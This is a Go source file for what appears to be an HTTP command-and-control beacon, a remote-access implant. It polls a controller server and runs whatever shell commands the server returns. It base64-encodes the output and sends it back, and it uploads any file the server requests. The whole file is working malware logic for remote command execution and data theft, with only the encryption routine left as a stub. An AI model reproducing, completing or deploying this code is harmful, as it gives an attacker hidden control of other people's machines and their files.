package main

import (
	"os"
	"io"
	"fmt"
	"bytes"
	"os/exec"
	"strings"
	"net/http"
	"encoding/json"
    "mime/multipart"
	b64 "encoding/base64"
)

// EncType

func (packet BeaconHttp) encrypt(string) []byte {
	return []byte { 65, 65, 65, 65, 65,65 }
}

// Request

func (packet BeaconHttp) queryServer() {
	resp, err := queryCommandHttp(string(packet.data))
	debugFatal(err)

	if err == nil {
		defer resp.Body.Close()

		if err != nil || resp.Status != "200 OK" {
			fmt.Println("Command status != 200: " + resp.Status)
		}
		
		controlDataBytes, err := io.ReadAll(resp.Body)
		debugFatal(err)
		var commResp CommandResponse
		json.Unmarshal(controlDataBytes, &commResp)
		
		packet.handleQueryResponse(commResp)
	} else if debug {
		fmt.Println("Couldn't reach command.")
	}
}

func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + endpoint
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = cmdHost
	return netClient.Do(req)
}

func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
	for _, cmd := range commResp.Exec {
		cmdSplit := strings.Fields(cmd);
		out, err := exec.Command(cmdSplit[0], cmdSplit[1:]...).Output()
		debugFatal(err)

		if err == nil && len(out) > 0 {
			data, err := json.Marshal(CommandUpdate{ip,id,"exec",out})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}

	for _, file := range commResp.Download {
		packet.upload(file)
	}
}

func (packet BeaconHttp) upload(filename string) {
	data, err := json.Marshal(CommandUpdate{ip,id,"upload", []byte(filename)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
	
    var b bytes.Buffer
    w := multipart.NewWriter(&b)
    var fw io.Writer
    file, err := os.Open(filename)
    debugFatal(err)
	
	if err != nil {
		return
	}
	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
    	debugFatal(err)
		return
    }    
	if _, err = io.Copy(fw, file); err != nil {
		debugFatal(err)
		return
    }

    w.Close()

	req, err := http.NewRequest("POST", url, &b)
	req.Host = cmdHost
	debugFatal(err)
	req.Header.Set("Content-Type", w.FormDataContentType())
    _, err = netClient.Do(req)
	debugFatal(err)
}